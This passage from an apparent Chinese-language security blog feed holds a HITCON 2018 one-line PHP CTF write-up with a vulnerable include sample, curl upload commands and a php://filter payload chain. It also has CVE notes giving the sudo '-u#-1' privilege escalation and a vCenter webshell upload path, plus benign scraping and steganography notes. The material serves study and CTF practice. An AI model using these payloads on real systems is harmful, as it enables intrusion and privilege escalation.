的時候派上用場</li><li>cleanup<br>  有個 <code>session.upload_progress.cleanup</code> 打開以後，只要文件一上傳完成，就會把這個 session 檔案刪掉</li><li>name、prefix  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.name</span> = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="hljs-attr">session.upload_progress.prefix</span> = <span class="hljs-string">&quot;upload_progress_&quot;</span><br></code></pre></td></tr></table></figure>  除此之外，name 是個可以控的東西，只要在 POST 的時候帶上這個東西，就可以成功控制這個 name，而這個 prefix + name 就會是存 session 時的 key 值，在<a href="https://www.php.net/manual/en/session.upload-progress.php">文件</a>裡有詳細說講到<br>  <img src="https://i.imgur.com/liimojv.png"><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2></li><li>auto_start<br>  <code>session.auto_start=On</code> 若開著，那就會自己產生 session，但若是沒有的話就會需要 call <code>session_start()</code>，default 是關掉的 :(，但是若是你帶上 PHP_SESSION_UPLOAD_PROGRESS 和 PHPSESSID，那它就會幫你開 session</li><li>session.use_strict_mode<br>  如果這個是 Off 的時候 PHPSESSID 是可以自己定義的<h2 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$vul</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span> (<span class="hljs-variable">$vul</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://127.0.0.1/sess.php -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=wiiwu&#x27;</span><br><br>$ curl http://127.0.0.1/sess.php -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=wiiwu&#x27;</span> -F <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=aa&#x27;</span> -F <span class="hljs-string">&#x27;test=@/etc/passwd&#x27;</span><br>sess_wiiwu<br><br>$ curl http://127.0.0.1/sess.php -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=wiiwu&#x27;</span> -F <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=aa&#x27;</span><br>sess_so2foja5kq4r4hubf5kct66c1u<br><br>$ curl http://127.0.0.1/sess.php -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=wiiwu&#x27;</span> -F <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=aa&#x27;</span> -F <span class="hljs-string">&#x27;no=@/etc/passwd&#x27;</span><br>sess_wiiwu<br></code></pre></td></tr></table></figure><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>回到題目本身，先實驗看看 session 的運作 (先把 clenup 關掉方便觀察)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wii@MSI:/var/lib/php/sessions$ <span class="hljs-built_in">cat</span> sess_wiiwu<br>upload_progress_meowmeow|a:5:&#123;s:10:<span class="hljs-string">&quot;start_time&quot;</span>;i:1634719967;s:14:<span class="hljs-string">&quot;content_length&quot;</span>;i:1958;s:15:<span class="hljs-string">&quot;bytes_processed&quot;</span>;i:1958;s:4:<span class="hljs-string">&quot;done&quot;</span>;b:1;s:5:<span class="hljs-string">&quot;files&quot;</span>;a:1:&#123;i:0;a:7:&#123;s:10:<span class="hljs-string">&quot;field_name&quot;</span>;s:4:<span class="hljs-string">&quot;file&quot;</span>;s:4:<span class="hljs-string">&quot;name&quot;</span>;s:6:<span class="hljs-string">&quot;passwd&quot;</span>;s:8:<span class="hljs-string">&quot;tmp_name&quot;</span>;s:14:<span class="hljs-string">&quot;/tmp/phpR5Apl9&quot;</span>;s:5:<span class="hljs-string">&quot;error&quot;</span>;i:0;s:4:<span class="hljs-string">&quot;done&quot;</span>;b:1;s:10:<span class="hljs-string">&quot;start_time&quot;</span>;i:1634719967;s:15:<span class="hljs-string">&quot;bytes_processed&quot;</span>;i:1636;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>題目會去讀檔案內的開頭，雖然檔案名稱在 upload_progress_*** 後面的部分已經可以控了，還是有前面的 prefix 需要處理，這裡可以用 base64 多次處裡來去掉，base64 只會處理它能夠處理的字，不能處理的就會被忽略，所以若把一個字串多次 decode 到最後這個字串就會消失。</p><ul><li>像是以 orange 解裡面的字串為例子，<code>upload_progress_ZZ</code>  decode 一次剩下 hikY 四個正常字，再 decode 一次就沒有剩下可以 de 的了，所以做三次 decode 就會讓整串字消失  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">decode<br><span class="hljs-string">&quot;��hi�k�޲�Y&quot;</span><br>decode<br><span class="hljs-string">&quot;�)&quot;</span><br>decode<br><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>  要注意每次做完都要是 4 的倍數，不然會吃到我們想要保留的 payload，所以這裡才用 ZZ 這個字串，因為它剛剛好</li></ul><p>最後就可以利用這方式，先把 payload encode 三次，前面加上 ZZ (要注意 payload 裡面不能有 &#x3D; ，所以需要再做一些 padding)，原本想錯了，想成後面 payload 會影響 decode 需要的次數，但其實不用，感謝 splitline 糾正。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://127.0.0.1/hitcon2018.php -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=wiiwu&#x27;</span> -F <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=ZZVVVSM0wyTkhhSGRKUjBGcldEQmtSbFpHYzNoWVYwRXZVRzV3V0dWV1ZrMVpNMFph&#x27;</span> -F <span class="hljs-string">&#x27;no=@/etc/passwd&#x27;</span><br><br>http://localhost/hitcon2018.php/?orange=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_wiiwu<br></code></pre></td></tr></table></figure><p>還有因為沒開 auto_start 也沒有用 session_start，但剛剛已經提過了不是問題，而它有開 <code>session.upload_progress.cleanup</code>，所以就會需要 race condition 比快了<br>最後是 <a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py">orange 的 exploit</a></p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul><li><a href="http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html">official writeup</a></li><li><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">orange github</a></li><li><a href="https://wonderkun.cc/2018/10/23/hitcon%202018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%B8%80%20one-line-php-challenge%20%E5%AD%A6%E4%B9%A0/">hitcon 2018受虐笔记一:one-line-php-challenge 学习</a></li><li><a href="https://www.php.net/manual/en/session.upload-progress.php">manual session.upload-progress</a></li><li><a href="https://ca01h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/">PHP session.upload_process + LFI实现RCE</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>write-up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-14287 linux sudo root</title>
    <link href="/2021/09/30/2021-09-30-CVE-2019-14287/"/>
    <url>/2021/09/30/2021-09-30-CVE-2019-14287/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287">MITRE CVE-2019-14287</a></p></blockquote><ul><li>在 Sudo before 1.8.28</li><li>當前身分有 sudo</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><ul><li>在 <code>sudo -l</code> 時可以列出像下面這個格式的東西<ul><li><code>(as user: as group) nopassword:commands</code></li><li>像是 <code>(ALL:!root) /bin/bash</code> 就是可以以所有的 user 身分、除了 root 以外的 group 執行 &#x2F;bin&#x2F;bash，就可以用這樣的指令切換身分執行 command</li><li><code>(ALL:ALL) /bin/ping</code> 就可以用 <code>sudo -u#1234 /bin/ping</code> 來用 user id 1234 的身分執行 ping</li></ul></li></ul><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>主要問題是發生在 system call 的 <code>setresuid</code> 中，在 <code>sysdeps/unix/sysv/linux/i386/setresuid.c</code> 可以看到他的 code<br>，他在 code 中有一段是會檢查傳進去的 ruid、euid、suid 是不是 &#x3D; -1，不等於的話才會 assign 這些值，否則就會沿用 default 的 0 (也就是 root)，造成這個問題。</p><p>在 <a href="https://www.sudo.ws/repos/sudo/rev/83db8dba09e7">patch</a> 的地方他們就是在 sudo 的 <code>lib/util/strtoid.c</code> 裡面把多加個檢查避免 id &#x3D;&#x3D; -1 或是 UINT_MAX（4294967295） (line 76)</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>用 <code>sudo -u#-1 &lt;可執行的 command&gt;</code> 就可以提權了</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">Sudo Vulnerability Cheat Sheet: Learn All About CVE-2019-14287</a></li><li><a href="https://blog.gtwang.org/linux/sudo-su-command-tutorial-examples/">Linux 的 su 與 sudo 指令教學與範例</a></li><li><a href="https://paper.seebug.org/1057/">CVE-2019-14287（Linux sudo 漏洞）分析</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE-survey</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>sudo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-21972 VMware vCenter Server</title>
    <link href="/2021/07/07/2021-07-07-CVE-2021-21972/"/>
    <url>/2021/07/07/2021-07-07-CVE-2021-21972/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21972">MITRE CVE-2021-21972</a></p></blockquote><ul><li>這個是個在 vCenter Server plugin 上的 RCE 洞</li><li>也就是說只要能碰到這台機器的網頁，就可以觸發這個洞了。</li><li>受影響的版本 <ul><li>VMware vCenter Server <ul><li>7.x before 7.0 U1c</li><li>6.7 before 6.7 U3l</li><li>6.5 before 6.5 U3n</li></ul></li><li>VMware Cloud Foundation<ul><li>4.x before 4.2 </li><li>5.3.x before 3.10.1.2</li></ul></li></ul></li></ul><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>有個 API <code>uploadova</code> 可以上傳 OVA 檔案 (&#x2F;ui&#x2F;vropspluginui&#x2F;rest&#x2F;services&#x2F;uploadova)，然後他如果他接到 tar 就會解開傳到 &#x2F;tmp&#x2F;unicorn_ova_dir 裡面，不過 tar 有的神奇的 feature，他可以接受 <code>../</code> 這樣的檔案名稱，所以就可以隨意碰到其他目錄了！</p><p>到這裡就很好想了，傳上後門到你要的地方，就得到了 RCE 了。</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><a href="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p><ul><li>這個 PoC 用的是冰蠍 shellcode，只要成功把惡意 payload 利用這個洞放到可以從網頁上碰到的位子就能開一個後門了</li><li>他一開始會先去戳 <code>/ui/vropspluginui/rest/services/uploadova</code> 這個地方有沒有開著，回傳 405 來確認洞在不在，如果在就會開始暴力試一下上傳 <code>../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/[某個數字]/0/h5ngc.war/resources/shell.jsp</code> 的那個變數，看哪個是正好開在外面的</li><li>實作上用了 Shodan 去掃了台灣的機器 <code>Vcenter country:TW</code>、<code>vSphere country:TW</code>，發現很多都是學網而且好像真的會被打。</li></ul><h2 id="冰蠍-webshell"><a href="#冰蠍-webshell" class="headerlink" title="冰蠍 webshell"></a>冰蠍 webshell</h2><ul><li>在其中一個 PoC 看到的 webshell，會對傳遞的東西加密，不容易被察覺</li><li><a href="https://www.anquanke.com/post/id/187874">红蓝对抗——加密Webshell“冰蝎”攻防</a></li><li>一開始會交換 16 bits 的密鑰，是個比較明顯的特徵</li><li><a href="https://xz.aliyun.com/t/2774">利用动态二进制加密实现新型一句话木马之PHP篇</a></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi/">CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞分析</a></li><li><a href="https://www.vmware.com/security/advisories/VMSA-2021-0002.html">VMware 官方警報</a></li><li><a href="https://kb.vmware.com/s/article/82374">官方 CVE-2021-21972 and CVE-2021-21973 修補建議</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE-survey</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>vCenter</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web Crawler Note</title>
    <link href="/2020/07/02/2020-07-02-Scrape_Learn/"/>
    <url>/2020/07/02/2020-07-02-Scrape_Learn/</url>
    
    <content type="html"><![CDATA[<p>今天是實習第二天，然後學長要我爬個網頁，之前對爬蟲的認識就是 Hank 學長講過一點，就花了十幾分鐘看一下再花十幾分鐘把東西爬一爬，然後我就不知道要做什麼了…，想說不然就把看到的內容整理一下，下次忘記就能直接翻這裡看。</p><p>爬蟲就是用程式去把本來會傳給瀏覽器、經過編譯給人看的內容抓下來整理成我們要的格式，這裡都以我最近要抓的網站 MITRE 為例，來抓 MITRE Software 頁面！</p><h1 id="抓網頁內容"><a href="#抓網頁內容" class="headerlink" title="抓網頁內容"></a>抓網頁內容</h1><p>先 import 需要的 package。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br></code></pre></td></tr></table></figure><p>把網站抓下來</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">resp = requests.get(<span class="hljs-string">&quot;https://attack.mitre.org/software/&quot;</span>)<br>bs = BeautifulSoup(resp.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br></code></pre></td></tr></table></figure><p>上面的 requests.get 就直接得到完整 response 了，<code>print(resp)</code> 會印出 HTTP Status Code，<code>resp.text</code> 則可以取得網頁內容，BeautifulSoup 則是可以方便我們拆開網頁內容的工具，所以這裡總之就先把網頁內容餵給它。<br>若需要印出給人看一點的 html 內容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(bs.prettify())<br></code></pre></td></tr></table></figure><h1 id="整理資料"><a href="#整理資料" class="headerlink" title="整理資料"></a>整理資料</h1><p>要去整理網頁資料就要先觀察它的架構，還有要爬的內容。<br>這裡以爬 Software 頁面的所有 Software 名字為例子，整個網頁長得像這個樣子<br><img src="https://i.imgur.com/C9wp6jl.jpg"><br>若要取得這個網頁的大標 Software，可以先看看它的 source code，看到大標是用 <code>&lt;h1&gt;&lt;/h1&gt;</code> tag 起來，所以可以這樣來取得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(bs.h1)<br></code></pre></td></tr></table></figure><p>上面這種會連著 tag 完整的印出來，也可以只取文字和去掉前後的空白</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(bs.h1.text.strip())<br></code></pre></td></tr></table></figure><p>用上面這些方法只能拿到第一個 tag 節點，所以我們這裡要從 table 抓內容、拿所有 <code>&lt;td&gt;</code> 時就得用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(bs.table.find_all(<span class="hljs-string">&#x27;td&#x27;</span>))<br></code></pre></td></tr></table></figure><p>回傳的格式會是一個 list，裡面塞著所有網頁中的 <code>&lt;td&gt;</code> 內容，稍微清理一下我們就能得到 software name list 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">software_name = []<br>software_table = bs.table.find_all(<span class="hljs-string">&#x27;td&#x27;</span>)<br><span class="hljs-keyword">while</span> software_table:<br>    software_name.append(software_table[<span class="hljs-number">0</span>].a.text.strip())<br>    software_table = software_table[<span class="hljs-number">3</span>:]<br><span class="hljs-built_in">print</span>(software_name)<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/jq3dqtK.jpg"><br>若需要取得其他內容，像是 <code>&lt;a&gt;</code> 中的 href 等等，也可以這樣拿</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">software_table<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.a</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;href&#x27;</span>]</span><br></code></pre></td></tr></table></figure><p>最後紀錄一下，像是在下面的這種單一 software 頁面中，有多個 table 但是我只需要特定的那個怎麼辦？<br><img src="https://i.imgur.com/DoNdgjW.jpg"><br>可以用這種方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">stand = bs.find(<span class="hljs-string">&#x27;h2&#x27;</span>,text=<span class="hljs-string">&#x27;Techniques Used&#x27;</span>)<br>table_list = stand.find_next_siblings(<span class="hljs-string">&#x27;table&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Request-的其他功能"><a href="#Request-的其他功能" class="headerlink" title="Request 的其他功能"></a>Request 的其他功能</h1><p>若在取 request 需要用 POST 的話</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = ((<span class="hljs-string">&#x27;key1&#x27;</span>, <span class="hljs-string">&#x27;value1&#x27;</span>), (<span class="hljs-string">&#x27;key1&#x27;</span>, <span class="hljs-string">&#x27;value2&#x27;</span>))<br>r = requests.post(<span class="hljs-string">&#x27;http://example.tw/post&#x27;</span>, data=payload)<br></code></pre></td></tr></table></figure><p>需要加 cookie 的話</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.get(<span class="hljs-string">&#x27;https://www.example.tw/index.html&#x27;</span>,cookies=&#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure><h1 id="一些-dict-的基礎"><a href="#一些-dict-的基礎" class="headerlink" title="一些 dict 的基礎"></a>一些 dict 的基礎</h1><p>生成一個 dict</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">software_name = &#123;&#125;<br></code></pre></td></tr></table></figure><p>塞資料，舉例 key 是流水號，value 是 software name</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(software_table)):<br>    software_name[i] = software[i]<br></code></pre></td></tr></table></figure><p>要把 dict 裡面的資料一一讀取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> num, software <span class="hljs-keyword">in</span> software_name.items():<br>    <span class="hljs-built_in">print</span>(num + <span class="hljs-string">&#x27;:&#x27;</span> + software + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="一些生成-json-格式會用到的"><a href="#一些生成-json-格式會用到的" class="headerlink" title="一些生成 json 格式會用到的"></a>一些生成 json 格式會用到的</h1><p>要先 import json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br></code></pre></td></tr></table></figure><p>直接把資料包好成 dict 型別輸出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;software_name.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    json.dump(software_name, fp)<br></code></pre></td></tr></table></figure><p>印出來的時候容易看一點</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(json.dumps(software_name, indent=<span class="hljs-number">4</span>, sort_keys=<span class="hljs-literal">True</span>))<br></code></pre></td></tr></table></figure><h1 id="os-package-裡常用的"><a href="#os-package-裡常用的" class="headerlink" title="os package 裡常用的"></a>os package 裡常用的</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br></code></pre></td></tr></table></figure><p>確認路徑存不存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">os.path.exists(path)<br></code></pre></td></tr></table></figure><p>確認檔案存不存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">os.path.isfile(path + filename)<br></code></pre></td></tr></table></figure><p>把檔名和副檔名切開，會回傳一個 list，<code>[&#39;檔名&#39;, &#39;副檔名&#39;]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">os.path.splitext(path)<br></code></pre></td></tr></table></figure><p>列出資料夾下的所有東西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">os.listdir(path)<br></code></pre></td></tr></table></figure><p>有兩種創資料夾的方式，有加 s 的是把整個路徑都建出來，另外一個是前面的必須先存在，它只建最尾端的那個，若前面的不存在就會出錯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">os.mkdir(save_path)<br>os.mkdirs(save_path)<br></code></pre></td></tr></table></figure><h1 id="就醬"><a href="#就醬" class="headerlink" title="就醬"></a>就醬</h1><p>學長的講義真的超級清楚，細節再另外自己 google 一下就很完善了，python 真的很容易上手，沒什麼門檻，所以爬蟲也寫起來很輕鬆，只要結構能搞清楚後，要收集大量網頁資料就很容易了，希望之後可以派些新工作給我，雖然這樣涼涼的也不錯啦…我就做自己的事。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://github.com/kehanlu/python">Hank Lu &#x2F; Python 入門</a></li><li><a href="https://blog.gtwang.org/programming/python-requests-module-tutorial/">Python 使用 requests 模組產生 HTTP 請求，下載網頁資料教學</a></li><li><a href="https://blog.gtwang.org/programming/python-beautiful-soup-module-scrape-web-pages-tutorial/">Python 使用 Beautiful Soup 抓取與解析網頁資料，開發網路爬蟲教學</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>crawler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>忍術隱寫の術</title>
    <link href="/2020/05/06/2020-05-06-Stego_Collation/"/>
    <url>/2020/05/06/2020-05-06-Stego_Collation/</url>
    
    <content type="html"><![CDATA[<p>作為一個 CTF 垃圾菜雞，每次下手都只能從別人可能根本不屑的misc開始看能不能撿些分數，最近想說仔細把 Stego 的套路都熟悉一下，下次撿分的時候至少不要連 misc 都撿不了，所以讀了一些關於 Stego 套路的文章，這裡稍微整理一下。</p><h2 id="隱藏檔案"><a href="#隱藏檔案" class="headerlink" title="隱藏檔案"></a>隱藏檔案</h2><p>這應該算是很容易被發現的一個套路，把檔案藏在圖片裡，原理是讀圖片的工具通常遇到 ‘FF D9’ 結尾就會把它當成 jpg 檔了，所以接在他後面的 data 它也不管，圖片也就能正常顯示，把副檔名改成 zip 就能變回壓縮檔了，只是覺得滿有趣所以記一下。<br><img src="https://i.imgur.com/Aqmtivw.jpg"><br>在 windows 裡面可以直接用 <code>copy /b a.jpg+b.zip output.jpg</code> 做出來，在 linux 裡也可以用 <code>cat a.jpg b.zip &gt; output.jpg</code> 做到。<br>遇到這種只要用 winhex 開起來看看就會發現後面還有東西了，或是用 binwalk 也可以輕易被發現。<br><img src="https://i.imgur.com/fY8DFmJ.jpg"><br>那如果需要把隱藏的東西，或是合在同一個檔案的東西拆開來有幾種方式。</p><ul><li>winhex 把要擷取的地方選起來，右鍵Edit-&gt;Copy Block-&gt;Into New File</li><li><a href="https://code.yidas.com/linux-dd-command-test-io/">dd</a> <code>dd if=[input] of=[output] skip=[ 從哪個byte開始做 ] bs=1</code></li><li>foremost <code>foremost [pic]</code></li></ul><h2 id="LSB-Least-Significant-Bit"><a href="#LSB-Least-Significant-Bit" class="headerlink" title="LSB(Least Significant Bit)"></a>LSB(Least Significant Bit)</h2><p>把訊息藏在圖片的數據後面，在 CTF 裡面遇到過，都用 <a href="http://www.caesum.com/handbook/Stegsolve.jar">stegsolve</a> 直接解決的，每個 pixel 都是三原色組成的，每個顏色 8bits，如果只改了最後一個 bit，通常是看不太出來的，所以可以把訊息藏在最後一個 bit 裡，用 ascii 或是只用這一 bits 組成不同的圖案來隱藏訊息，這種作法 jpg 是做不到的，因為 jpg 會壓縮圖片，這些隱藏訊息就可能被破壞了，png 和 bmp 才有可能用上這套路。<br>順帶一提遇到 QRcode 或是條碼都可以用這個<a href="https://online-barcode-reader.inliteresearch.com/">網站</a>來掃。</p><h2 id="檔案修復"><a href="#檔案修復" class="headerlink" title="檔案修復"></a>檔案修復</h2><p>有時候是給的圖片壞掉了要去修，這種時候需要稍微知到一下各種檔案的結構會比較好，不過常常都是開頭的地方出錯而已，用編輯器修好就好了。<br>有時候是需要改圖片的長寬，把它改大一點就能看到被藏起來的部分了。</p><ul><li><a href="https://my.oschina.net/ososchina/blog/801358">PNG</a></li><li><a href="https://dev.gameres.com/Program/Visual/Other%20/GIFDoc.htm">GIF</a></li><li><a href="https://blog.csdn.net/blues1021/article/details/45422557">JPG</a></li><li><a href="https://en.wikipedia.org/wiki/Magic_number_%28programming%29#Magic_numbers_in_files">Magic Number in File</a></li></ul><h2 id="metadata"><a href="#metadata" class="headerlink" title="metadata"></a>metadata</h2><p>有時候訊息會直接藏在圖片的 metadata，可以用 windows 的右鍵內容直接看到，或是在 linux 下可以 <code>exiftool</code> 來查看，也可以直接丟到<a href="https://www.metadata2go.com/">線上</a>處理。<br>像是 picoCTF 2018 的 Truly an Artist。<br><img src="https://i.imgur.com/Sen9lMs.png"><br><img src="https://i.imgur.com/f4xAb7P.png"></p><h2 id="雙圖"><a href="#雙圖" class="headerlink" title="雙圖"></a>雙圖</h2><p>通常會給兩張圖的，就會需要比較兩張圖的差異，可能會是 XOR&#x2F;SUB&#x2F;AND&#x2F;OR&#x2F;MUL 不一定，可以善用 stegsolve 裡面的 Analysis-&gt;Image Combiner 處理。<br>有時候會是需要比較 data 內的差異，抓出有問題的 data 段來分析。</p><h2 id="Blind-WaterMark"><a href="#Blind-WaterMark" class="headerlink" title="Blind WaterMark"></a>Blind WaterMark</h2><p><a href="https://github.com/chishaxie/BlindWaterMark">腳本和說明</a><br>除了圖片以外，音檔、pdf、pcap 也都可以藏東西，之後只要有遇到相關的題目會再回來補上。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://appleu0.sinaapp.com/?p=501">隐写术总结</a></li><li><a href="https://zhuanlan.zhihu.com/p/30539398">【从零开始学CTF】5、CTF中的隐写术</a></li><li><a href="https://blog.splitline.tw/2018/12/07/stego-tricks.html">那些Stego題的套路</a></li><li><a 